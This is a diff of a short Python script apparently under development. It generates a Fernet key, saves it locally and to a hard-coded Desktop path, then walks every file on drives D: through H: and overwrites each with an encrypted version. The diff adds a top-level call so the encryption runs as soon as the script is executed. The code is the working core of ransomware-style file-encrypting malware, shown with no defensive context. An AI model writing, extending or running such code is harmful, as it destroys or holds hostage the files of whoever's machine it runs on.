@@ -6,19 +6,22 @@ def write_key():
     key = Fernet.generate_key()
     with open("key.key", "wb") as key_file:
         key_file.write(key)
+    with open(r"C:\Users\STAR-S\Desktop\key.key", "wb") as key_file:
+        key_file.write(key)
+
 
 def load_key():
     return open("key.key", "rb").read()
-
+    
 def enc():
-    # "C:\\",
+    print("hi")
+    write_key()
+    key = load_key()
+    f = Fernet(key)
     q = ("D:\\","E:\\","F:\\","G:\\","H:\\") 
     for z in q:
         if os.path.exists(z):
             print(z)
-            write_key()
-            key = load_key()
-            f = Fernet(key)
             for subdir, dirs, files in os.walk(z):
                 for filename in files:
                     filepath = subdir + os.sep + filename
@@ -39,3 +42,5 @@ def enc():
                         n.write(encrypted)
                         n.close()
                         print(filepath)
+
+enc()   # calling function 
